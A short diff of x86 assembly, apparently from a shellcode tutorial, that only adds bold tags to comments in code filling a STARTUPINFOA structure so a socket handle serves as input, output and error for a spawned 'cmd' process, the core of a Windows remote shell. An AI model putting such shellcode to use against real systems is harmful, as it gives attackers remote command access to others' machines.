@@ -400,8 +400,8 @@ mov ecx,esp             ; Make ECX a pointer to the 'cmd' command
 ; Now fill the `_STARTUPINFOA` structure
 xor edx,edx             ; Zero out EBX
 push esi                ; <b>hStdError</b> = our socket handler
-push esi                ; hStdOutput = our socket handler
-push esi                ; hStdInput = our socket handler
+push esi                ; <b>hStdOutput</b> = our socket handler
+push esi                ; <b>hStdInput</b> = our socket handler
 push edx                ; cbReserved2 = NULL
 push edx                ; wShowWindow = NULL
 xor eax, eax            ; Zero out EAX
